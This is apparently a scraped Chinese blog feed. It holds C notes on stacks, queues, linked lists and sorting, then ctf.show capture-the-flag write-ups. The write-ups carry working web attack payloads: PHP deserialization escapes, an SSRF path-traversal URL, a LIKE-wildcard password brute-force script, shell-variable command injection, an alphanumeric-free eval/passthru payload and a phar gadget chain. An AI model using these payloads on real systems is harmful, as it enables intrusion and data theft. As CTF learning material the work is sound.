\u0026#39;}\u0026#39;)\rreturn \u0026#39;{\u0026#39;;\rreturn 0;\r} 除了栈思想，这道题还有另外一个思路\n可以尝试使用字符串替换的方式\nPython和PHP都有对应的replace函数\n这里用python来写一些另外的思路，也算是投机取巧罢\ndef check(s):\rwhile \u0026#39;()\u0026#39; in s or \u0026#39;[]\u0026#39; in s or \u0026#39;{}\u0026#39; in s :\rs=s.replace(\u0026#39;()\u0026#39;,\u0026#39;\u0026#39;)\rs=s.replace(\u0026#39;[]\u0026#39;,\u0026#39;\u0026#39;)\rs=s.replace(\u0026#39;{}\u0026#39;,\u0026#39;\u0026#39;)\rreturn s==\u0026#39;\u0026#39;\rif __name__==\u0026#34;__main__\u0026#34;:\rs=input()\rprint(check(s)) 纸牌游戏 #\r这里就简单的描述一下游戏规则\n两个人分别为 A 和 B\n两人手里分别有 6 张牌，这里约定牌面大小为 1~9\n由 A 先出一张， B 再出一张，这样的顺序进行出牌\n如果某人打出的牌与桌上某张牌大小一样，那么即可获得两张牌及其中间打出的牌，并放到自己手牌的末尾\n当任意一人手牌出完时，对手获胜\n先简单的思考一下吧\n解决这个题需要用到上面的知识，即队列和栈\n直接上代码👇：\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;string.h\u0026gt;\tstruct queue\r{\rint data[1000];\rint head ;\rint tail;\r};\rstruct stack {\rint data[10];\rint top;\r};\rint main()\r{\rint t;\rint number[10];//用桶来记录桌上的牌和牌数\rmemset(number,0,sizeof(number));//先初始化为0\rstruct queue a, b;//两个队列\rstruct stack s;//栈\ra.head = 0, a.tail = 0, b.tail = 0, b.head = 0;//初始化队列\rs.top = 0;\rfor (int i = 0; i \u0026lt; 6; i++)\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;a.data[a.tail]);\ra.tail++;\r}//录入a的手牌\rfor (int i = 0; i \u0026lt; 6; i++)\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;b.data[b.tail]);\rb.tail++;\r}//录入b的手牌\rwhile (a.tail \u0026gt; a.head \u0026amp;\u0026amp; b.tail \u0026gt; b.head)\r{\rt = a.data[a.head];//先取出a的手牌\rif (number[t] == 0)//判断桌上是否有相同的牌，这里是没有\r{\ra.head++;\ts.top++;\rs.data[s.top] = t;//将a的牌入栈\rnumber[t]=1;\r}\relse//假如a出牌后，能够进行吃牌\r{\ra.head++;\ra.data[a.tail] = t;\ra.tail++;\rwhile (s.data[s.top] != t)\r{\ra.data[a.tail] = s.data[s.top];\rnumber[s.data[s.top]]=0;//将栈顶的数标记为0，因为要退栈了\ra.tail++;\rs.top--;\r}//这个循环的作用是依次退出相应的牌，并补到手牌末端\ra.data[a.tail] = s.data[s.top];\rnumber[s.data[s.top]] = 0;\ra.tail++;\rs.top--;//由于上面这个while到最后一个数字就停了，这里在另外加一段代码，使得吃牌完毕\r}\rif (a.head == a.tail)//这时a的手牌已经打完了，\rbreak;\r//下面到b出牌了，基本思路和上面的差不多，cv一下，将a改成b就可以了\rt = b.data[b.head];\rif (number[t] == 0)\r{\rb.head++;\ts.top++;\rs.data[s.top] = t;\tnumber[t] = 1;\r}\relse//b能吃牌的情况\r{\rb.head++;\rb.data[b.tail] = t;\rb.tail++;\rwhile (s.data[s.top] != t)\r{\rnumber[s.data[s.top]] = 0;\rb.data[b.tail] = s.data[s.top];\rb.tail++;\rs.top--;\r}\rnumber[s.data[s.top]] = 0;\rb.data[b.tail] = s.data[s.top];\rs.top--;\rb.tail++;\r}\r}//至此出牌阶段的代码就这样\r//下面是判断输赢的阶段了\rif (b.head == b.tail)//a win\r{\rprintf(\u0026#34;a win\\na的手牌是\\n\u0026#34;);\rfor (int i = a.head; i \u0026lt; a.tail; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, a.data[i]);\r}\rif (s.top != 0)//如果桌上有牌，便输出牌桌上的牌\r{\rprintf(\u0026#34;\\n桌上的牌为：\\n\u0026#34;);\rfor (int i = 1; i \u0026lt;= s.top; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, s.data[i]);\r}\r}\relse\r{\rprintf(\u0026#34;\\n桌上没有牌了\\n\u0026#34;);\r}\r}\relse\r{\rprintf(\u0026#34;b win\\na的手牌是\\n\u0026#34;);\rfor (int i = b.head; i \u0026lt; b.tail; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, b.data[i]);\r}\rif (s.top != 0)//如果桌上有牌，便输出牌桌上的牌\r{\rprintf(\u0026#34;\\n桌上的牌为：\\n\u0026#34;);\rfor (int i = 1; i \u0026lt;= s.top; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, s.data[i]);\r}\r}\relse\r{\rprintf(\u0026#34;\\n桌上没有牌了\\n\u0026#34;);\r}\r}\rreturn 0;\r} 基本的思路是比较清晰的，代码的重复片段也比较多，只是看起来长\n这里要小注意的是输出的时候栈的top是否为空，先加再进栈和先进栈再加会有一点小区别，可能会导致数组空值\n在数组里面也要注意空值的问题\n链表 #\r其实上学期已经接触过链表了\n但是大多数做题环境几乎没有用到使用链表的情况\n这里还是就着书再复习一遍\n我对于链表的理解：由结构体首尾相连形成的链状动态数组\n“动态”：当我们申请数组的时候，一旦给出数组的具体大小便不能再进行更改，比如说 int a[100]，这个整型数组只能装100个int，不能越界。其实链表并不是以数组方式进行储存的，只是方便理解，链表可以通过malloc函数申请新的空间并将空间与链条尾部进行连接，这样来延长链的长度，即达到动态数组的效果\n**链表的优点：**有多少占多少，不浪费空间，相较于使用数组储存未知量的数据要开得很大的情况，链表能节约很大空间\n链表的元结构（或者最小单位）：由一个数据量和一个指针组成，形成一个结构体，一个结构体的指针指向下一个结构体的数据量，以此形成链条\n具体结构可以参考下图👇\n先简单的来写一个链表的使用吧\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;stdlib.h\u0026gt;\rstruct pNode {\rint a;\rstruct pNode* next;\r};\rint main()\r{\rint n = 5;//输入5个数字\rstruct pNode *head=NULL,*p,*q,*t;\rp = head;\rq = head;\rfor (int i = 0; i \u0026lt; n; i++)\r{\rint num;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;num);\rp = (struct pNode*)malloc(sizeof(struct pNode));//申请一个结构体大小的空间\rp-\u0026gt;a = num;\rp-\u0026gt;next= NULL;\tif (head == NULL)//第一次创建节点的情况下\r{\rhead = p;\r}\relse\r{\rq-\u0026gt;next=p;\r}\rq = p;\r}\rt = head;\rwhile (t != NULL)\r{\rprintf(\u0026#34;%d \u0026#34;, t-\u0026gt;a);\rt = t-\u0026gt;next;\r}\rreturn 0;\r} 那么想想如何插入数据、删除数据？\n很明显\n假如我们要插入数据，只需要端开插入位置的指针，并且重新申请空间，最后“缝合”起来\n如果要删除数据，则更为简单，只需要将指针绕过不需要的数据，让上一个结构体的指针指向删除结构体的下一个结构体就行啦\n那么来写一写插入数据的代码吧\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;stdlib.h\u0026gt;\rstruct pNode {\rint a;\rstruct pNode* next;\r};\rint main()\r{\rint n = 5;//输入5个数字\rstruct pNode *head=NULL,*p,*q,*t;\rp = head;\rq = head;\rfor (int i = 0; i \u0026lt; n; i++)\r{\rint num;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;num);\rp = (struct pNode*)malloc(sizeof(struct pNode));//申请一个结构体大小的空间\rp-\u0026gt;a = num;\rp-\u0026gt;next= NULL;\tif (head == NULL)//第一次创建节点的情况下\r{\rhead = p;\r}\relse\r{\rq-\u0026gt;next=p;\r}\rq = p;\r}\rt = head;\rint insert;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;insert);//输入待插入的数字\rwhile (t != NULL)\r{\rint num = t-\u0026gt;a;\rif (t-\u0026gt;next-\u0026gt;a \u0026gt; insert||t-\u0026gt;next==NULL)\r{\rp= (struct pNode*)malloc(sizeof(struct pNode));\rp-\u0026gt;a = insert;\rp-\u0026gt;next = t-\u0026gt;next;\rt-\u0026gt;next = p;\rbreak;\r}\rt = t-\u0026gt;next;\r}\rt = head;\rwhile (t != NULL)\r{\rprintf(\u0026#34;%d \u0026#34;, t-\u0026gt;a);\rt = t-\u0026gt;next;\r}\rreturn 0;\r} 假如输入 1 10 20 60 100 ，insert输入为 50\n那么输出就会在 20和60 中间插入一个50，完成插入数据操作\n删除数据的话就讲一下思路罢，不想写代码了😫\n用两个结构体指针，一前一后（或者一左一右），向右移动（默认链表向右延申嘛），当右指针遇到要删除的数据之后，左指针停住不动，右指针跳跃到下一个结构体，然后让左指针的结构体指向右指针的结构体，实现删除操作\n自言自语：代码可能写得还是有点冗余，待改进，语言表述可能还需要加强😄\n","date":"2023-07-10","externalUrl":null,"permalink":"/posts/2023/07/stack-queue-linked-list/","section":"Posts","summary":"","title":"栈、队列、链表","type":"posts"},{"content":"从软工毕业学长那里淘来一本《啊哈！算法》\n然后跟着这本书学习学习，记录一下\n桶排序 #\r在生活中会遇到一些排序问题，比如站队列的时候要按身高排序、考试的名次要按分数排序、网上购物有时会按价格排序……\n对于一组很简单的数字，桶排序无疑是最快最简单的\n“桶”的理解：一个一维数组，大小为输入数字的最大值+1，数组的每一个下标都是一个标签，默认每一个数组元素的值都是0，当遍历到_变量值等于下标值_的时候呢，这个数组元素的值就自增，最后这个一维数组的值就有0或非0，只需要按下标大小取出元素值就能完成排序。\n例如：输入5个数字，并从大到小输出\n用C语言代码实现就是这样👇（编译器为VS 2022，一些关键字会有所不同\n#include\u0026lt;stdio.h\u0026gt;\rint main()\r{\rint a[21];\rfor (int i = 0; i \u0026lt; 21; i++)\ra[i] = 0;//初始化数组为0\rfor (int i = 0; i \u0026lt; 5; i++)\r{\rint num;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;num);\ra[num]++;\r}\rfor (int i = 20; i \u0026gt;= 0; i--)\r{\rif (a[i] != 0)\r{\rfor (int j = 0; j \u0026lt; a[i]; j++)\r{\rprintf(\u0026#34;%d \u0026#34;, i);\r}\r}\r}\rreturn 0;\r} 排序是可以实现了，那么想想有什么弊端？\n桶排序是基于数组的下标实现的\n那么肯定会存在这些问题：\n数字不能为负数或者小数\n数字不能大于数组的最大值-1\n数组也不能太大，不然会十分浪费空间\n下面是一道有关桶排序的洛谷题：\n给定一个字符串 s ，根据字符出现的 频率 对其进行 降序排序 。一个字符出现的 频率 是它出现在字符串中的次数。\n示例：\n输入: s = \u0026ldquo;tree\u0026rdquo;\n输出: \u0026ldquo;eert\u0026rdquo;\n解释: \u0026rsquo;e\u0026rsquo;出现两次，\u0026lsquo;r\u0026rsquo;和\u0026rsquo;t\u0026rsquo;都只出现一次。\n因此\u0026rsquo;e\u0026rsquo;必须出现在\u0026rsquo;r\u0026rsquo;和\u0026rsquo;t\u0026rsquo;之前。此外，\u0026ldquo;eetr\u0026quot;也是一个有效的答案。\n提示：\n1 \u0026lt;= s.length \u0026lt;= 5 * 105\ns 由大小写英文字母和数字组成\n实现代码如下：\n#include\u0026lt;stdio.h\u0026gt;\r#include\u0026lt;string.h\u0026gt;\r#include\u0026lt;stdlib.h\u0026gt;\rchar s[500001];\rint a[130];\rint cmp(char* p1, char* p2)\r{\rint n = a[*p1];\rint m = a[*p2];\rif (n == m)\r{\rreturn *p1 - *p2;//下标一样则按照字母顺序排列\r}\rreturn m-n;//下标不一样则按照频率排列\r}\rint main()\r{\rmemset(a, 0, sizeof(a));\rscanf_s(\u0026#34;%s\u0026#34;, s,500001);\rint len = strlen(s);\rfor (int i = 0; i \u0026lt; len; i++)\r{\ra[s[i]]++;\r}\rqsort(s, len, sizeof(char), cmp);\rprintf(\u0026#34;%s\u0026#34;, s);\r} 这里涉及到了qsort快速排序函数，不过主体还是桶排序\n冒泡排序 #\r冒泡的基本思想是：每次比较两个相邻的元素，然后根据大小交换\n下面是动态图演示：\n这种排序的核心就是双重for循环进行遍历比较\n网上随便找一段代码：\n#include\u0026lt;stdio.h\u0026gt;\tint main()\r{\rint n[10] = { 25,35,68,79,21,13,98,7,16,62 };//定义一个大小为10的数组\rint i, j, temp;\rfor (i = 1; i \u0026lt;= 9; i++)//外层循环是比较的轮数，数组内有10个数，那么就应该比较10-1=9轮\r{\rfor (j = 0; j \u0026lt;= 9 - i; j++)//内层循环比较的是当前一轮的比较次数，例如：第一轮比较9-1=8次，第二轮比较9-2=7次\r{\rif (n[j] \u0026gt; n[j + 1])//相邻两个数如果逆序，则交换位置\r{\rtemp = n[j];\rn[j] = n[j + 1];\rn[j + 1] = temp;\r}\r}\r}\rfor (i = 0; i \u0026lt; 10; i++)\rprintf(\u0026#34;%d \u0026#34;, n[i]);\r} 这是最基本的冒泡方法\n可以在第一层for循环里设立判断，如果第二层for里没有进行交换则说明已经完成排序，就退出循环\n不过当数组比较大的时候，使用冒泡排序并不是一个好的选择\n快速排序 #\r这是一种最常见的排序方式\n基本思想：使用“分治”的策略，将序列分为两个子序列，并设立一个基准数（通常为第一个数字），比较基准数两侧的数据大小来排序（两侧并不是真的这个数字的两侧，而是序列的两侧）\n比如说下面这种排列：\n3 1 2 5 4 6 9 7 10 8\n这时以数字6为基准数，左边都是小于6，右边则都是大于6，这是快速排序想要达到的效果\n如何实现？\n假如初始序列为这样：\n6 1 2 7 9 3 4 5 10 8\n分别从序列的两端开始探测，可以理解为两个指针向中间移动（）\n以6为基准数，先从右往左找一个小于6的数字，再从左往右找一个大于6的数字，并将其交换（不是同时进行的\n于是第一遍之后就找到 7 和 5 两个数字并交换\n形成新的序列：\n6 1 2 5 9 3 4 7 10 8\n然后重复这样的操作\n这里就省略一部分\n最终会遇到这样的数列：\n6 1 2 5 4 3 9 7 10 8\n可以看到\n从左往右找大于的时候左指针会指向7\n从右往左找小于的时候右指针会指向3\n而这种排序要求的是右指针要先于左指针移动\n于是右指针停留在 3 ，左指针在移动的时候会在3与右指针相遇！\n看看 3 和基准数 6 的位置关系呢？\n将 3 和 6 交换一下便能发现此时序列为：\n3 1 2 5 4 6 9 7 10 8\n6的左边全是小于，而右边全是大于\n至此第一轮探测便真正结束，6回到了正确的位置\n不过 6 两侧的序列还是无序的，需要进行排序\n基于这种思想，可以通过以下C代码实现快速排序\n#include\u0026lt;stdio.h\u0026gt;\tint a[101];\rvoid quickSort(int left, int right)\r{\rint i, j, k, temp;\rif (left \u0026gt; right)\rreturn;\rtemp = a[left];//设立基准数，以左边的为基准数\ri = left;\rj = right;//可以看作两个指针,这里用下标来替代指针\rwhile (i != j)\r{\rwhile (a[j] \u0026gt;= temp \u0026amp;\u0026amp; i \u0026lt; j)\r{\rj--;//从右往左找，直到找到小于，或者跑到最左端，当然跑到最左端的话那么这个数字就是最大了，直接放到right去\r}\rwhile (a[i] \u0026lt;= temp \u0026amp;\u0026amp; i \u0026lt; j)\r{\ri++;\r}\rif (i \u0026lt; j)//没有相遇的情况,就交换\r{\rk = a[i];\ra[i] = a[j];\ra[j] = k;\r}\r}\r//最后归位基准数\ra[left] = a[i];\ra[i] = temp;\rquickSort(left, i - 1);\rquickSort(i + 1, right);//递归调用，分别处理两端序列\rreturn;\r}\rint main()\r{\rint i, j, n;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;n);\rfor (int c = 1; c \u0026lt;= n; c++)\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;a[c]);\r}\rquickSort(1, n);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, a[i]);\r}\rreturn 0;\r} 至于为什么非得从右边开始找，可以这样理解👇\n给出一组序列：\n6 1 2 7 9\n先从左边找到 7\n再从右边开始，到 7 的时候两个指针就相遇咯\n按照上面说的，相遇那么就该归位\n那么得到：\n7 1 2 6 9\n能发现结果不对啊！\n问题就在于：如果我们先从左边开始找，那么找到的那个数字一定是大于基准数的，交换之后就违背了左小右大的原则\n所以：我们必须从右边开始，也就是从基准数的对面开始。\n快速排序还是要依靠数组，不过相较于冒泡，每次的交换都是跳跃式的\n不过当序列处于完全逆序的情况下（最坏的情况），快排的时间复杂度和冒泡是一样的\n简单的学习了一下三个基本的排序方式\n排序方式不止这三种：\n冒泡排序（Bubble Sort）\n插入排序（Insertion Sort）\n希尔排序（Shell Sort）\n选择排序（Selection Sort）\n快速排序（Quick Sort）\n归并排序（Merge Sort）\n堆排序（Heap Sort）\n计数排序（Counting Sort）\n桶排序（Bucket Sort）\n基数排序（Radix Sort）\n后面再学习其他的罢\n","date":"2023-07-09","externalUrl":null,"permalink":"/posts/2023/07/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%8E%92%E5%BA%8F/","section":"Posts","summary":"","title":"几个简单的排序","type":"posts"},{"content":"日常练习题 题目来源：ctf.show\n月饼杯 #\rWeb1_此月圆 #\r题目附件中有的index.php\n\u0026lt;?php\rclass a\r{\rpublic $uname;\rpublic $password;\rpublic function __construct($uname,$password)\r{\r$this-\u0026gt;uname=$uname;\r$this-\u0026gt;password=$password;\r}\rpublic function __wakeup()\r{\rif($this-\u0026gt;password===\u0026#39;yu22x\u0026#39;)\r{\rinclude(\u0026#39;flag.php\u0026#39;);\recho $flag;\t}\relse\r{\recho \u0026#39;wrong password\u0026#39;;\r}\r}\r}\rfunction filter($string){\rreturn str_replace(\u0026#39;Firebasky\u0026#39;,\u0026#39;Firebaskyup\u0026#39;,$string);\r}\r$uname=$_GET[1];\r$password=1;\r$ser=filter(serialize(new a($uname,$password)));\r$test=unserialize($ser);\r?\u0026gt; 这里只能GET传入一个名为1的变量，password是已经设置好为1的\n但是在这个代码里还存在一个filter函数，将Firebasky替换成了Firebaskyup\n这是可以进行反序列化字符逃逸的攻击点\n在wakeup魔术方法里，当passsword是yu22x的时候便会输出flag\n那么下面进行构造字符串\n由于有filter的存在，每一个Firebasky会逃逸出2个字符\n我们想要构造的字符串是这样的\r\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:5:\u0026#34;yu22x\u0026#34;;}\r长度为30 那么就需要uname里面有15个Firebasky，来造成30个长度的溢出\nPOC:\r?1= FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:5:\u0026#34;yu22x\u0026#34;;} Web2_故人心 #\r代码审计题\n\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\r$a=$_GET[\u0026#39;a\u0026#39;];\r$b=$_GET[\u0026#39;b\u0026#39;];\r$c=$_GET[\u0026#39;c\u0026#39;];\r$url[1]=$_POST[\u0026#39;url\u0026#39;];\rif(is_numeric($a) and strlen($a)\u0026lt;7 and $a!=0 and $a**2==0){\r$d = ($b==hash(\u0026#34;md2\u0026#34;, $b)) \u0026amp;\u0026amp; ($c==hash(\u0026#34;md2\u0026#34;,hash(\u0026#34;md2\u0026#34;, $c)));\rif($d){\rhighlight_file(\u0026#39;hint.php\u0026#39;);\rif(filter_var($url[1],FILTER_VALIDATE_URL)){\r$host=parse_url($url[1]);\rprint_r($host); if(preg_match(\u0026#39;/ctfshow\\.com$/\u0026#39;,$host[\u0026#39;host\u0026#39;])){\rprint_r(file_get_contents($url[1]));\r}else{\recho \u0026#39;差点点就成功了！\u0026#39;;\r}\r}else{\recho \u0026#39;please give me url!!!\u0026#39;;\r} }else{\recho \u0026#39;想一想md5碰撞原理吧?!\u0026#39;;\r}\r}else{\recho \u0026#39;第一个都过不了还想要flag呀?!\u0026#39;;\r} 一层一层的来看吧\n第一层：\na是数字，长度小于7，不等于0，但是平方后等于0\n其实只要构造一个极小的数字就可以了\n用科学计数法：\na=1e-200 就是1的负200次方 0.000000\u0026hellip;1，再平方一下这个数已经小到计算机都不想要了，所以说平方就等于0咯。\n第二层：\nb要等于b的md2值，然后c要等于c的md2值的md2值\n这里涉及到弱比较，要求等号两端都要是0e开头\n直接跑的话都不知道要跑多久，不过在robots.txt里发现hint\n可以看到给出了末尾几位数\n根据这个来写一个脚本\n\u0026lt;?php\rfor ($i = 0; $i \u0026lt; 10000000; $i++) {\r$a=hash(\u0026#39;md2\u0026#39;,\u0026#39;0e\u0026#39;.$i.\u0026#39;024452\u0026#39;);\rif (is_numeric($a)\u0026amp;\u0026amp;substr($a,0,2)==\u0026#39;0e\u0026#39;)\r{\recho \u0026#39;1=0e\u0026#39;.$i.\u0026#39;024452\u0026#39;;\recho PHP_EOL;\r}\r$b=hash(\u0026#39;md2\u0026#39;,hash(\u0026#39;md2\u0026#39;,\u0026#39;0e\u0026#39;.$i.\u0026#39;48399\u0026#39;));\rif(is_numeric($b)\u0026amp;\u0026amp;substr($b,0,2)==\u0026#39;0e\u0026#39;)\r{\recho \u0026#39;2=0e\u0026#39;.$i.\u0026#39;48399\u0026#39;;\recho PHP_EOL;\r}\r} 得到两个字符串：\nb=0e652024452\rc=0e603448399 第三层：\n要POST一个url\nhint说了flag在/f10g.txt里\n这里filter_var函数可以解析很多协议\n这里的话尝试用SSRF，使用不存在的协议\nphp遇到不认识的协议就会当目录处理\n于是构造如下payload，配合目录穿越一下得到flag\nurl=a://ctfshow.com/../../../../../../../fl0g.txt Web3_莫负婵娟 #\r在源代码里发现部分代码\n\u0026lt;!-- username yu22x --\u0026gt;\r\u0026lt;!-- SELECT * FROM users where username like binary(\u0026#39;$username\u0026#39;) and password like binary(\u0026#39;$password\u0026#39;)--\u0026gt; 看来是like模糊查询，%是sql语句中的通配符，可以匹配多个字符，下划线___可以匹配一个字符\n这里%被ban了，不过下划线可以使用\n首先测试得到密码有32位\n当密码大于或小于32位的时候会报\nwrong username or password\n而密码是32位的时候报的是\nI have filtered all the characters. Why can you come in? get out!\n知道位数就可以写脚本爆破了\n脚本如下：\nimport requests\rimport string\rdict=string.digits+string.ascii_letters\rurl=\u0026#39;http://3bf67942-614c-402b-a661-0b62f443f665.challenge.ctf.show/login.php\u0026#39;\rpassword=\u0026#39;\u0026#39;\rfor i in range(32):\rfor j in dict:\rpasswd=password+j+(31-i)*\u0026#39;_\u0026#39;\rdata={\u0026#39;username\u0026#39;:\u0026#39;yu22x\u0026#39;,\u0026#34;password\u0026#34;:passwd}\rr=requests.post(url=url,data=data)\rif \u0026#39;wrong\u0026#39; not in r.text:\rpassword+=j\rprint(password)\rbreak; 跑出来密码是：67815b0c009ee970fe4014abaa3Fa6A0\n然后下一个界面是\n一些常见的命令执行符号都被过滤掉了\n看了看网上的wp，小写字母全被过滤。大写字母、数字、$、:没被过滤。\n有个新思路，利用环境变量来构造字符串\n可以看到系统的环境变量是这样的，我们可以用切片操作来取出其中的字母，像下面这样\n0;${PATH:5:1}${PATH:2:1} //ls 爆出目录 看到flag在第一个文件\n可以利用nl命令读取第一个文件\n这里星号被过滤，但是问号没被过滤\npoc：\r0;${PATH:14:1}${PATH:5:1} ????.???\r//0；nl flag.php 吃瓜杯 #\rshellme #\r这道题有问题，phpinfo之间Ctrl+F就能找到flag\nshellme_Revenge #\r这道题进去也是phpinfo，找找有效信息\n在php变量里找到hint\n得到源码如下：\n\u0026lt;?php\rerror_reporting(0);\rif ($_GET[\u0026#39;looklook\u0026#39;]){\rhighlight_file(__FILE__);\r}else{\rsetcookie(\u0026#34;hint\u0026#34;, \u0026#34;?looklook\u0026#34;, time()+3600);\r}\rif (isset($_POST[\u0026#39;ctf_show\u0026#39;])) {\r$ctfshow = $_POST[\u0026#39;ctf_show\u0026#39;];\rif (is_string($ctfshow) || strlen($ctfshow) \u0026lt;= 107) {\rif (!preg_match(\u0026#34;/[!@#%^\u0026amp;*:\u0026#39;\\\u0026#34;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/\u0026#34;,$ctfshow)){\reval($ctfshow);\r}else{\recho(\u0026#34;fucccc hacker!!\u0026#34;);\r}\r}\r} else {\rphpinfo();\r}\r?\u0026gt; 一个命令执行，过滤了大小写字母（C可以用）、一些特殊符号以及4-9之间的数字\n不过自增构造命令的关键要素： $ _ [ ] ; + = 没有过滤掉\n这里就尝试使用自增来进行命令执行\n我们的目的是要构造system(order)这样的命令\n但是又不能出现字母，那就只能引入外部的参数，所以要构造为\n$_GET[1]($_GET[2]); php代码如下：\n\u0026lt;?php\r$_=C;\r$_++;\r$_++;\r$__=$_;//E\r$_++;\r$_++;\r$___=$_;//G\r$_=(C/C.C)[0];//N 这句话的意思，字母/字母=0/0就会被认为是无法被测量也就是NaN可以取得N字母\r$_++;//o $_++;//p\r$_++;//q\r$_++;//r\r$_++;//s\r$_=_.$___.$__.++$_;//_GET\r$$_[1]($$_[2]);//$_GET[1]($_GET[2]);\rpost的时候要url编码一次\r这里有个坑，在phpinfo里也可以发现，system这个函数被ban了，不过可以替代他的passthru没有被ban\r就可以利用passthru来进行命令执行 热身 #\r签到体\n看看代码审计\ninclude(\u0026#34;flag.php\u0026#34;);\rhighlight_file(__FILE__);\rif(isset($_GET[\u0026#39;num\u0026#39;])){\r$num = $_GET[\u0026#39;num\u0026#39;];\rif($num==4476){\rdie(\u0026#34;no no no!\u0026#34;);\r}\rif(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num)){\rdie(\u0026#34;no no no!!\u0026#34;);\r}\rif(!strpos($num, \u0026#34;0\u0026#34;)){\rdie(\u0026#34;no no no!!!\u0026#34;);\r}\rif(intval($num,0)===4476){\recho $flag;\r}\r} 首先不能等于4476，然后不能有字母和小数点，strpos在num里找0（这里没给参数，默认从0位开始找）\n最后intval里的参数0，说明了根据变量类型来转换，意思就是可以传八进制或者16进制\n那么思路就有了：\nnum我们可以用八进制来绕过，因为八进制不需要字母\nstrpos函数的话只需要在num的[1]这个下标里是0，那么strpos就返回1，然后if里就变成0，则不执行\nPOC:\r?num=+010574 ATTup #\r有两个界面，一个上传，一个查询\n先看看查询\n看到一个find.php，尝试用find.php来查看他自己\n抓个包,发送到repeater ,直接放包的话他会一直弹窗,不好看\n我们在find.php发现以下PHP代码\nclass View {\rpublic $fn;\rpublic function __invoke(){\r$text = base64_encode(file_get_contents($this-\u0026gt;fn));\recho \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;\u0026#34;.$text.\u0026#34;\u0026#39;);self.location=document.referrer;\u0026lt;/script\u0026gt;\u0026#34;;\r}\r}\rclass Fun{\rpublic $fun = \u0026#34;:)\u0026#34;;\rpublic function __toString(){\r$fuc = $this-\u0026gt;fun;\r$fuc();\rreturn \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Be a happy string~\u0026#39;);self.location=document.referrer;\u0026lt;/script\u0026gt;\u0026#34;;\r}\rpublic function __destruct()\r{\recho \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Just a fun \u0026#34;.$this-\u0026gt;fun.\u0026#34;\u0026#39;);self.location=document.referrer;\u0026lt;/script\u0026gt;\u0026#34;;\r}\r}\r$filename = $_POST[\u0026#34;file\u0026#34;];\r$stat = @stat($filename);--\u0026gt; 有文件上传,又有读取文件,那么应该就是phar反序列化了,\n先上poc:\n\u0026lt;?php\rclass Fun{\rpublic $fun ;\r}\rclass View {\rpublic $fn=\u0026#39;/flag\u0026#39;;\r}\r$d=new Fun();//实例化对象\r$v = new View();//实例化对象\r$d-\u0026gt;fun = $v;//第一层嵌套，为了触发invoke而准备的\r$new = new Fun();//再实例化一个对象\r$new-\u0026gt;fun = $d;//为触发tostring而准备的\r$phar = new Phar(\u0026#34;test.phar\u0026#34;); //文件名，后缀名必须为phar\r$phar-\u0026gt;startBuffering();\r$phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39; __HALT_COMPILER();\u0026#39;); //设置stub\r$phar-\u0026gt;setMetadata($new); //将自定义的meta-data存入manifest\r$phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件\r$phar-\u0026gt;stopBuffering(); //签名自动计算 解释一下,这里实例了三个对象,分别是d v 和new\n形成了这样的链条:\nnew-\u0026gt;fun指向d d-\u0026gt;fun指向v\n因为在生成的phar文件中自定义的data是new\n在@stat读取文件的时候就先从new这里读\n我画了一张图:\n触发链就是这样的,用上面的php代码生成一个phar文件上传\n然后再用phar协议读取文件就能得到flag,记得要改为zip或者rar文件后缀\n魔女(未完成 #\r这道题没做出来,网上也没有wp,就只能写写过程\n进去是一个登陆界面\n在源代码中发现\n界面中是没有register的,这里我们抓包修改一下dologin,实现注册一个账户\n进入之后有几个界面, 分别是主页, 修改信息, 个人资料, 以及退出登录\n主页里没什么东西,就一只猫在那里晃\n然后个人资料里有一个下载图片的链接\n我们抓一下包,发现文件名字是可控的\n这里我们尝试下index.php\n包含了一个base.php, 那再把它下载一下\nbase.php 的代码如下\n\u0026lt;?php\rdefine(\u0026#39;CTF\u0026#39;, \u0026#39;SHOW\u0026#39;);\rdefine(\u0026#39;DEBUG\u0026#39;,true);\rdefine(\u0026#39;WEB_ROOT\u0026#39;,__DIR__.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;WEB_APP_ROOT\u0026#39;,WEB_ROOT.\u0026#39;application\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;FRAMEWORK_ROOT\u0026#39;,WEB_ROOT.\u0026#39;framework\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;DEFAULT_METHOD\u0026#39;,\u0026#39;main\u0026#39;);\rdefine(\u0026#39;DEFAULT_ACTION\u0026#39;,\u0026#39;index\u0026#39;);\rdefine(\u0026#39;DEFAULT_TABLE_PRE\u0026#39;,\u0026#39;ctfshow_\u0026#39;);\rdefine(\u0026#39;DEFAULT_EXT\u0026#39;,\u0026#39;.php\u0026#39;);\rdefine(\u0026#39;DEFAULT_ACTION_DIR\u0026#39;,\u0026#39;action\u0026#39;);\rdefine(\u0026#39;DEFAULT_MODEL_DIR\u0026#39;,